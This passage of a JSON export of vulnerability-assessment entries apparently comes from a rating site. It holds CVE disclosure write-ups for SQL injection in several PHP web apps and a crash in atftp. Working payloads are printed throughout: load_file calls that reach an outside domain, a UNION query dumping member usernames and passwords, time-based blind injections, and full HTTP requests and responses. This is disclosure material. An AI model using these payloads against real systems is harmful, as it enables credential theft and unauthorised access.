      "document": "## [CVE-nu11-101321](https://www.sourcecodester.com/php/13115/engineers-online-portal-php.html)\r\n## [Vendor](https://www.sourcecodester.com/user/51695/activity)\r\n![logo](https://raw.githubusercontent.com/nu11secur1ty/CVE-nu11secur1ty/main/vendors/janobe/CVE-nu11-101321/docs/ps_portal.png)\r\n\r\n## Description:\r\nThe id parameter from `my_classmates.php` on the Engineers Online Portal app appears to be vulnerable to three types of SQL injection attacks, boolean-based blind, error-based, and UNION query. The payload '+(select load_file('\\\\hh2s4z961nps5mtx8px8zoud248ywq0erhf82yqn.nu11secur1tyexploit.net\\ggc'))+' was submitted in the id parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. Also, user login is vulnerable to SQL-Injection bypass authentication on parameter \"username\".\r\n\r\n## MySQL Request:\r\n\r\n```mysql\r\nGET /nia_munoz_monitoring_system/my_classmates.php?id=191'%2b(select%20load_file('%5c%5c%5c%5chh2s4z961nps5mtx8px8zoud248ywq0erhf82yqn.nu11secur1tyexploit.net%5c%5cggc'))%2b' HTTP/1.1\r\nHost: 192.168.1.180\r\nCookie: PHPSESSID=5ndeh840im8k21e9mtnu57gp11\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.180/nia_munoz_monitoring_system/dashboard_student.php\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\n```\r\n## Response:\r\n\r\n```mysql\r\nHTTP/1.1 200 OK\r\nDate: Wed, 13 Oct 2021 07:15:40 GMT\r\nServer: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.4.24\r\nX-Powered-By: PHP/7.4.24\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 10632\r\n\r\n<!DOCTYPE html>\r\n<html class=\"no-js\">\r\n<head>\r\n<title>NIA Project Monitoring System</title>\r\n       <meta name=\"description\" content=\"Learning Management System\">\r\n       <meta name=\"keywords\" conte\r\n...[SNIP]...\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/edit/main/vendors/janobe/CVE-nu11-101321)\r\n\r\n## Proof:\r\n[href](https://streamable.com/a55ac9)\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "9ff7fd60-b5e4-4ac0-99c6-9f54c5c823b8",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "6ae287f6-72da-4131-b2b6-4ef435e6427f",
      "created": "2021-10-14T08:45:05.608285Z",
      "revisionDate": "2021-10-14T08:45:05.606167Z",
      "document": "## [CVE-2021-42224](https://phpgurukul.com/ifsc-code-finder-project-using-php/)\r\n## [Vendor](https://phpgurukul.com/author/admin/)\r\n![logo](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-42224/docs/Screenshot%202021-10-14%20104403.png)\r\n\r\n## Description:\r\n- vulnerability: `all or nothing` \r\n\r\nSQL Injection vulnerability exists in IFSC Code Finder Project 1.0 via the searchifsccode POST parameter in /search.php.\r\nThe searchifsccode parameter appears to be vulnerable to SQL injection attacks. The test payload '+(select load_file('\\\\\\\\bp4frncin7wvtb1vnxr1n6ngh7n0bzzq2eu1kp9.nu11secur1tycollaborator.net\\\\ing'))+' was submitted in the searchifsccode parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. Also the parameter \"searchifsccode\" from search.php is XSS-Dom vulnerable plus PHPSESSID hijacking.\r\n\r\n## SQL injection Types\r\n\r\n```mysql\r\n---\r\nParameter: searchifsccode (POST)\r\n    Type: time-based blind\r\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\r\n    Payload: searchifsccode=849487'+(select load_file('\\\\\\\\bp4frncin7wvtb1vnxr1n6ngh7n0bzzq2eu1kp9.nu11secur1tycollaborator.net\\\\ing'))+'') AND (SELECT 1445 FROM (SELECT(SLEEP(5)))EBDq) AND ('ubep'='ubep&search=%C2%9E%C3%A9e\r\n\r\n    Type: UNION query\r\n    Title: Generic UNION query (NULL) - 2 columns\r\n    Payload: searchifsccode=849487'+(select load_file('\\\\\\\\bp4frncin7wvtb1vnxr1n6ngh7n0bzzq2eu1kp9.nu11secur1tycollaborator.net\\\\ing'))+'') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176766b71,0x624a5562647364654b616a684c6d546a427263576377794168415561525872414e53664d6a6e6444,0x7171786271),NULL-- -&search=%C2%9E%C3%A9e\r\n---\r\n```\r\n## Mysql Request:\r\n\r\n```mysql\r\nPOST /IFSC%20Code%20Finder%20Project%20Using%20PHP/ifscfinder/search.php HTTP/1.1\r\nHost: 192.168.1.180\r\nOrigin: http://192.168.1.180\r\nCookie: PHPSESSID=jmir9unlgf2inpr758uva4ruhb\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.180/IFSC%20Code%20Finder%20Project%20Using%20PHP/ifscfinder/\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Length: 42\r\n\r\nsearchifsccode=849487'%2b(select%20load_file('%5c%5c%5c%5cbp4frncin7wvtb1vnxr1n6ngh7n0bzzq2eu1kp9.nu11secur1tycollaborator.net%5c%5cing'))%2b'&search=%C2%9E%C3%A9e\r\n```\r\n\r\n## MySQL Response:\r\n\r\n```mysql\r\nHTTP/1.1 200 OK\r\nDate: Thu, 14 Oct 2021 07:02:37 GMT\r\nServer: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.4.24\r\nX-Powered-By: PHP/7.4.24\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nContent-Length: 7797\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<!doctype html>\r\n<html class=\"no-js\" lang=\"en\">\r\n\r\n<head>\r\n\r\n<!--====== Title ======-->\r\n<title>IFSC Code Finder Portal | Home</title>\r\n\r\n<!--====== Slick CSS ======-->\r\n<link\r\n...[SNIP]...\r\n```\r\n## Proof:\r\n[href](https://streamable.com/kqadhc)\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-42224)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2ac8ebba-9328-4d3e-8d05-3a1f16673696",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "87d730e9-750c-46d0-8c95-7f3fc0f5847c",
      "created": "2021-10-14T14:31:42.992223Z",
      "revisionDate": "2021-10-14T16:58:56.753093Z",
      "document": "Being exploited in the wild as of April 2021. Juniper Networks has [a write-up](https://blogs.juniper.net/en-us/threat-research/sysrv-botnet-expands-and-gains-persistence) on seeing payloads being delivered by the Sysrv botnet. Kinda surprising it took that long.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "db448998-f6b2-45e6-84df-c31645403d85",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "b2425acd-37a0-4b81-bb70-9f4d2f4e7c21",
      "created": "2021-10-15T09:29:46.944252Z",
      "revisionDate": "2021-10-15T10:39:59.065793Z",
      "document": "## [CVE-2021-41054](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41054)\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41054/docs/Screenshot%202021-10-15%20122055.png)\r\n\r\n## Description:\r\ntftpd_file.c in atftp through 0.7.4 has a buffer overflow because buffer-size handling does not properly consider the combination of data, OACK, and other options. A malicious user in network layer 2 can execute a malicious file to bring down the server, every time when this will be possible! Or he can create a malicious cron job to do this, every time when the cron will execute it.\r\n\r\n## Idea -by: \r\n- Martin Dummer\r\n\r\n## Author of the PoC-client and TestServ.sh automation\r\n- @nu11secur1ty\r\n\r\n## Reproduce:\r\n\r\n- Run `TestServ.sh`\r\n\r\n```bash \r\nbash TestServ.sh\r\n```\r\n- Output:\r\n\r\n```bash \r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]: Advanced Trivial FTP server started (0.7)\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:   running in daemon mode on port 2000\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:   logging level: 7\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:      trace enabled\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:   directory: tmp/\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:   user: root.root\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:   log file: /dev/stdout\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:   not forcing to listen on local interfaces.\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:   server timeout: Not used\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:   tftp retry timeout: 5\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:   maximum number of thread: 100\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:   option timeout:   enabled\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:   option tzise:     enabled\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:   option blksize:   enabled\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:   option multicast: enabled\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:      address range: 239.255.0.0-255\r\nOct 15 12:14:06 nu11secur1ty-dev atftpd[3645.140540916002560]:      port range:    1758\r\n```\r\n- Run `PoC-client.sh`\r\n\r\n```bash\r\nbash PoC-client.sh\r\n```\r\n- Output:\r\n\r\n```bash\r\nTrace mode on.\r\nOption blksize = 8\r\nOption timeout = 3\r\nsent RRQ <file: tmp/nu11secur1ty.txt, mode: octet <timeout: 3, blksize: 8>>\r\ntimeout: retrying...\r\n```\r\n-------------------------------------------------------------------------------------------------------\r\n\r\n## Test PoC Output:\r\n\r\n- `(core dumped)` /usr/sbin/atftpd\r\n\r\n```bash\r\nOct 15 12:10:50 nu11secur1ty-dev atftpd[3276.140024667366976]: timeout option -> 3\r\nOct 15 12:10:50 nu11secur1ty-dev atftpd[3276.140024667366976]: blksize option -> 8\r\nOct 15 12:10:50 nu11secur1ty-dev atftpd[3276.140024667366976]: sent OACK <timeout: 3, blksize: 8>\r\nTestServ.sh: line 8:  3276 Segmentation fault      (core dumped) /usr/sbin/atftpd --user=$(id -un) --group=$(id -gn) --daemon --no-fork --trace --logfile=/dev/stdout --verbose=7 --port 2000 tmp\r\nTrace mode on.\r\nOption blksize = 8\r\nUsage: connect host-name [port]\r\nNot connected.\r\n```\r\n\r\n## Proof:\r\n[href](https://streamable.com/9xhbhv)\r\n\r\n## Source:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-41054)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b82e641c-d2ae-4613-b574-147e7f982659",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "5609e4b3-c6b4-4ae7-87f2-8633bce651e0",
      "created": "2021-10-15T15:41:50.903668Z",
      "revisionDate": "2021-10-15T15:41:50.907189Z",
      "document": "This is now being exploited in the wild by the Necro botnet as was reported at https://securityaffairs.co/wordpress/123275/cyber-crime/necro-botnet-dvrs.html",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "26b52063-2976-4a9a-a310-cd9ce69e1b4c",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "ea3dc4ee-5c9c-43e7-affc-715d43ce0ac9",
      "created": "2021-10-15T15:45:22.916451Z",
      "revisionDate": "2021-10-15T15:45:22.915972Z",
      "document": "This is now being exploited in the wild by the Necro botnet as was reported at https://securityaffairs.co/wordpress/123275/cyber-crime/necro-botnet-dvrs.html",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "f2553406-a0cc-4003-b6aa-51f3cdb14553",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "31634c15-e2d1-4c4d-9397-2f49ae792fd8",
      "created": "2021-10-16T18:02:40.816947Z",
      "revisionDate": "2023-05-17T08:36:16.705371Z",
      "document": "## [CVE-2021-41947](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41947)\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41947/docs/Screenshot%202021-10-16%20204720.png)\r\n\r\n## Description:\r\nA SQL statement in request parameter vulnerability exists in Subrion CMS v4.2.1 in the visual-mode.\r\nThis application should not incorporate any user-controllable data directly into SQL queries. \r\nParameterized queries (also known as prepared statements) should be used to safely insert data into predefined queries. \r\nIn no circumstances should users be able to control or modify the structure of the SQL query itself?\r\n\r\n## MySQL Request:\r\n\r\n```mysql\r\nGET /panel/visual-mode.json?get=access&type=blocks%27%20UNION%20ALL%20SELECT%20username,%20password%20FROM%20sbr421_members%20--%20-&object=landing_what_is_this&page=index HTTP/1.1\r\nHost: 192.168.1.4\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\n```\r\n\r\n## MySQL Response:\r\n\r\n```mysql\r\nHTTP/1.1 200 OK\r\nDate: Sat, 16 Oct 2021 16:40:30 GMT\r\nServer: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.4.24\r\nX-Powered-By: PHP/7.4.24\r\nSet-Cookie: INTELLI_c8e38fc98c=arfqsm98vhdqe3s8kod7nokh56; path=/\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nSet-Cookie: INTELLI_c8e38fc98c=arfqsm98vhdqe3s8kod7nokh56; expires=Sat, 16-Oct-2021 17:10:30 GMT; Max-Age=1800; path=/\r\nContent-Length: 72\r\nConnection: close\r\nContent-Type: application/json\r\n\r\n{\"error\":true,\"message\":\"Action is forbidden.\",\"code\":403,\"result\":true}\r\n```\r\n\r\n## Risk:\r\n- Medium\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-41947)\r\n\r\n## Proof\r\n[href](https://www.nu11secur1ty.com/2021/10/cve-2021-41947.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "533fe88e-00cd-49e0-8558-ea5292a4f72d",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "0b4d3ed3-fc04-45fe-b2d9-5e91fc41fad2",
      "created": "2021-10-18T16:57:11.259903Z",
      "revisionDate": "2023-05-17T08:35:22.890451Z",
      "document": "## [CVE-nu11-101821](https://www.sourcecodester.com/php/12808/e-learning-system-using-phpmysqli.html)\r\n## [Vendor](https://www.sourcecodester.com/user/51695/activity)\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-nu11secur1ty/main/vendors/janobe/CVE-nu11-101821/docs/Screenshot%202021-10-18%20140507.png)\r\n\r\n## MySQL Request-1:\r\n\r\n```mysql\r\nPOST /caiwl/admin/login.php HTTP/1.1\r\nHost: 192.168.1.4\r\nOrigin: http://192.168.1.4\r\nCookie: PHPSESSID=8qen88airh7u0ai06ijhk96a21\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.4/caiwl/admin/login.php\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Length: 90\r\n\r\nuser_email=IlZWXHcK@nu11secur1tycollaborator.net'&user_pass=m2G%21b5m%21D8&btnLogin=%C2%9E%C3%A9e\r\n```\r\n\r\n## MySQL Response-1:\r\n\r\n```mysql\r\nResponse 1\r\nHTTP/1.1 200 OK\r\nDate: Mon, 18 Oct 2021 07:42:37 GMT\r\nServer: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.4.24\r\nX-Powered-By: PHP/7.4.24\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nContent-Length: 7099\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n\r\n<!-- Bootstrap core CSS -->\r\n\r\n\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n<title>Login V18</title>\r\n<meta charset=\"UTF-8\">\r\n<meta name=\"viewport\" content=\"width=device-width, initi\r\n...[SNIP]...\r\n<b>Fatal error</b>: Uncaught Error: Call to undefined function mysql_error() in C:\\xampp\\htdocs\\caiwl\\include\\accounts.php:28\r\nStack trace:\r\n#0 C:\\xampp\\htdocs\\caiwl\\admin\\login.php(165): User::userAuthentication('IlZWXHcK@burpco...', '0314337dea4e6aa...')\r\n#1 {main}\r\nthrown in <b>\r\n...[SNIP]...\r\n```\r\n----------------------------------------------------------------------------------\r\n\r\n## MySQL Request-2:\r\n\r\n```mysql\r\nPOST /caiwl/admin/login.php HTTP/1.1\r\nHost: 192.168.1.4\r\nOrigin: http://192.168.1.4\r\nCookie: PHPSESSID=8qen88airh7u0ai06ijhk96a21\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.4/caiwl/admin/login.php\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Length: 90\r\n\r\nuser_email=ICpueGIm@nu11secur1tycollaborator.net''&user_pass=g1M%21g9l%21F1&btnLogin=%C2%9E%C3%A9e\r\n```\r\n\r\n## MySQL Response-2\r\n\r\n```mysql\r\nHTTP/1.1 200 OK\r\nDate: Mon, 18 Oct 2021 07:42:40 GMT\r\nServer: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.4.24\r\nX-Powered-By: PHP/7.4.24\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nContent-Length: 6832\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n\r\n<!-- Bootstrap core CSS -->\r\n\r\n\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n<title>Login V18</title>\r\n<meta charset=\"UTF-8\">\r\n<meta name=\"viewport\" content=\"width=device-width, initi\r\n...[SNIP]...\r\n```\r\n\r\n## MySQL Request-3\r\n\r\n```mysql\r\nPOST /caiwl/admin/login.php HTTP/1.1\r\nHost: 192.168.1.4\r\nOrigin: http://192.168.1.4\r\nCookie: PHPSESSID=8qen88airh7u0ai06ijhk96a21\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.4/caiwl/admin/login.php\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Length: 90\r\n\r\nuser_email=QXVzAYzI@nu11secur1tycollaborator.net'%2b(select*from(select(sleep(20)))a)%2b'&user_pass=u0U%21y2z%21D9&btnLogin=%C2%9E%C3%A9e\r\n```\r\n\r\n## MySQL Response-3\r\n\r\n```mysql\r\nHTTP/1.1 200 OK\r\nDate: Mon, 18 Oct 2021 07:42:51 GMT\r\nServer: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.4.24\r\nX-Powered-By: PHP/7.4.24\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nContent-Length: 6811\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n\r\n<!-- Bootstrap core CSS -->\r\n\r\n\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n<title>Login V18</title>\r\n<meta charset=\"UTF-8\">\r\n<meta name=\"viewport\" content=\"width=device-width, initi\r\n...[SNIP]...\r\n```\r\n\r\n## Reproduce\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/edit/main/vendors/janobe/CVE-nu11-101821)\r\n\r\n## Proof:\r\n[href](https://www.nu11secur1ty.com/2021/10/cve-nu11-101821.html)\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "06dde23d-e108-4a49-9235-658385243526",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "afe04d7f-a87f-441c-9bb1-14cbf8a28c0c",
      "created": "2021-10-19T16:12:31.857031Z",
      "revisionDate": "2023-05-17T08:34:21.59941Z",
      "document": "## [CVE-2021-41511](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41511)\r\n## [Vendor](https://www.sourcecodester.com/users/tips23)\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41511/doc/Screenshot%202021-10-19%20174724.png)\r\n\r\n## Description:\r\nThe username and password field of login in Lodging Reservation Management System V1 can give access to any user by using SQL injection to bypass authentication.\r\nA malicious user can store a malicious payload into the accommodations app and can hijack the PHPSESSID, then he can use to hijack a login session.\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-41511)\r\n\r\n## CVE Proof of Concept:\r\n[href](https://www.nu11secur1ty.com/2021/10/cve-2021-41511.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6b3b8305-ae0c-469e-9453-365e75477371",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "87b14eb6-efeb-4570-a641-55c225fd803e",
      "created": "2021-10-21T12:10:21.127554Z",
      "revisionDate": "2023-05-17T08:32:58.638356Z",
      "document": "## [CVE-2021-35458](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35458)\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-35458/docs/Screenshot%202021-10-21%20150026.png)\r\n\r\n\r\n## Description:\r\nThe Online Pet Shop We App (by: oretnom23 ) v1.0 is vulnerable to SQL injection - bypass authentication also Reflected-XSS vulnerability\r\nThe MySQL vulnerable app to SQL injection is login.php, with parameter: \"name=\"username\"\" without no sanitizing. \r\nAfter the successful PWNED of the credentials for the admin account.\r\nThe malicious user can manipulate all information and does malicious stuff with information from customers.\r\nAlso, this application is vulnerable to Reflected-XSS vulnerability, the malicious user can execute a malicious javascript\r\npayload code in the parameter: (name=\"search\") on the general app search form of this application.\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-35458)\r\n\r\n## Proof:\r\n[href](https://www.nu11secur1ty.com/2021/10/cve-2021-35458.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
